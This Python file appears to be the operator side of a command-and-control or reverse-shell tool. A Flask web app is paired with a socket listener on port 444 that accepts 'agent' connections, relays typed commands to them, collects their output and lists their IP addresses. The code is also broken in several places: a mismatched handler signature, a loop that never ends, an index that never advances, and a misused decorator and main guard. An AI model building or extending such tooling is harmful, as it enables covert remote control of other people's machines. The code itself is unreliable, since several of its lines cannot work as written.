import socket
import threading

from flask import *

ip_v4 = '127.0.0.1'
port = 444

thread_index = 0
THREADS = []
CMD_INPUT = []
CMD_OUTPUT = []
IPs = []

for i in range(20):
    THREADS.append("")
    CMD_INPUT.append("")
    CMD_OUTPUT.append("")
    IPs.append("")

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((ip_v4, port))

app = Flask("__main__")


def handler(connection):
    msg = connection.recv(2048).decode()
    CMD_OUTPUT[thread_index] = msg
    while CMD_INPUT[thread_index] != 'quit' or CMD_INPUT[thread_index] != "":
        # print(msg)
        msg = CMD_INPUT[thread_index]
        connection.send(msg.encode())
        msg = connection.recv(2048).decode()
        CMD_OUTPUT[thread_index] = msg
    server_socket.close()


@app.before_first_request()
def init_server():
    server_socket.listen(2)
    global THREADS
    global IPs
    while True:
        connection, address = server_socket.accept()
        t = threading.Thread(target=handler, args=(connection, address))
        THREADS.append('t')
        IPs[thread_index] = address
        t.start()


@app.route("/home")
def index():
    return render_template("index.html")


if __name__ := '__main__':
    app.run(debug=True)


@app.route("/agents")
def agents():
    return render_template("agents.html", threads=THREADS, ips=IPs)
